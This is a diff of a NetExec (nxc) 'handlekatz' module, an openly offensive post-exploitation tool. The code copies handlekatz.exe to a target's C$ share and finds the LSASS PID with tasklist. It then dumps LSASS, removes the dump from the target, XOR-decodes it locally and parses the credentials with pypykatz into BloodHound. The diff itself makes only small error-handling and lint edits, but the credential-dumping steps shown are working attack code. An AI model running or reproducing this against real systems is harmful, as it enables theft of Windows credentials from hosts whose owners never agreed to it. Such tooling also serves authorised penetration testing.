@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 # handlekatz module for nxc python3
 # author of the module : github.com/mpgn
 # HandleKatz: https://github.com/codewhitesec/HandleKatz
@@ -10,6 +7,7 @@ import re
 import sys
 
 from nxc.helpers.bloodhound import add_user_bh
+import pypykatz
 
 
 class NXCModule:
@@ -20,13 +18,12 @@ class NXCModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        """
+        r"""
         TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
         HANDLEKATZ_PATH       Path where handlekatz.exe is on your system (default: /tmp/)
         HANDLEKATZ_EXE_NAME   Name of the handlekatz executable (default: handlekatz.exe)
         DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = HANDLEKATZ_PATH)
         """
-
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
         self.tmp_share = self.tmp_dir.split(":")[1]
@@ -52,12 +49,19 @@ class NXCModule:
             self.dir_result = module_options["DIR_RESULT"]
 
     def on_admin_login(self, context, connection):
+        handlekatz_loc = self.handlekatz_path + self.handlekatz
+        
         if self.useembeded:
-            with open(self.handlekatz_path + self.handlekatz, "wb") as handlekatz:
-                handlekatz.write(self.handlekatz_embeded)
+            try:
+                with open(handlekatz_loc, "wb") as handlekatz:
+                    handlekatz.write(self.handlekatz_embeded)
+            except FileNotFoundError:
+                context.log.fail(f"Handlekatz file specified '{handlekatz_loc}' does not exist!")
+                sys.exit(1)
 
         context.log.display(f"Copy {self.handlekatz_path + self.handlekatz} to {self.tmp_dir}")
-        with open(self.handlekatz_path + self.handlekatz, "rb") as handlekatz:
+
+        with open(handlekatz_loc, "rb") as handlekatz:
             try:
                 connection.conn.putFile(self.share, self.tmp_share + self.handlekatz, handlekatz.read)
                 context.log.success(f"[OPSEC] Created file {self.handlekatz} on the \\\\{self.share}{self.tmp_share}")
@@ -73,7 +77,7 @@ class NXCModule:
             p = p[0]
 
         if not p or p == "None":
-            context.log.fail(f"Failed to execute command to get LSASS PID")
+            context.log.fail("Failed to execute command to get LSASS PID")
             return
         # we get a CSV string back from `tasklist`, so we grab the PID from it
         pid = p.split(",")[1][1:-1]
@@ -121,17 +125,17 @@ class NXCModule:
             except Exception as e:
                 context.log.fail(f"[OPSEC] Error deleting lsass.dmp file on share {self.share}: {e}")
 
-            h_in = open(self.dir_result + machine_name, "rb")
-            h_out = open(self.dir_result + machine_name + ".decode", "wb")
+            h_in = open(self.dir_result + machine_name, "rb")  # noqa: SIM115
+            h_out = open(self.dir_result + machine_name + ".decode", "wb")  # noqa: SIM115
 
             bytes_in = bytearray(h_in.read())
             bytes_in_len = len(bytes_in)
 
             context.log.display(f"Deobfuscating, this might take a while (size: {bytes_in_len} bytes)")
 
-            chunks = [bytes_in[i : i + 1000000] for i in range(0, bytes_in_len, 1000000)]
+            chunks = [bytes_in[i: i + 1000000] for i in range(0, bytes_in_len, 1000000)]
             for chunk in chunks:
-                for i in range(0, len(chunk)):
+                for i in range(len(chunk)):
                     chunk[i] ^= 0x41
 
                 h_out.write(bytes(chunk))
@@ -177,4 +181,4 @@ class NXCModule:
                     if len(credz_bh) > 0:
                         add_user_bh(credz_bh, None, context.log, connection.config)
                 except Exception as e:
-                    context.log.fail("Error opening dump file", str(e))
+                    context.log.fail(f"Error opening dump file: {e}")
